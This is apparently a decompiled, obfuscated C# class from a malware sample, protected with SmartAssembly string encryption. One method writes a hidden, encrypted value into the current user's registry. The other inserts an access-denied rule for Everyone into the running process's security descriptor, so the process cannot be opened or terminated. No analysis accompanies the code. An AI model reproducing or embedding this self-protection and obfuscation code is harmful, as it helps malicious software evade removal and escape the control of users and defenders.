using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

internal sealed class KRaOgpcKUef
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr WXzcxYvKSqUW, int VIycqFMgMjJaWPN, [Out] byte[] LNSrTBmvocqQg, uint hYWZSaywzsT, out uint QRajoJSOGpSpAm);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr NwiCGRCvBhB, int WFOWJWSvsVKkb, [In] byte[] itTdEGnmdLVK);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void YOUOlTbYLwvsU(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107380555)));
			registryKey.SetValue(XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107380450)), getString_0(107349851));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor KqrqxqfCmr(IntPtr intptr_0)
	{
		byte[] lNSrTBmvocqQg = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, lNSrTBmvocqQg, 0u, out var QRajoJSOGpSpAm);
		if ((long)QRajoJSOGpSpAm > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, lNSrTBmvocqQg = new byte[QRajoJSOGpSpAm], QRajoJSOGpSpAm, out QRajoJSOGpSpAm))
		{
			return null;
		}
		return new RawSecurityDescriptor(lNSrTBmvocqQg, 0);
	}

	private void HuBstVbOiOjnBjq(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void KdaynHekAElXkXya()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = KqrqxqfCmr(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			HuBstVbOiOjnBjq(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static KRaOgpcKUef()
	{
		Strings.CreateGetStringDelegate(typeof(KRaOgpcKUef));
	}
}
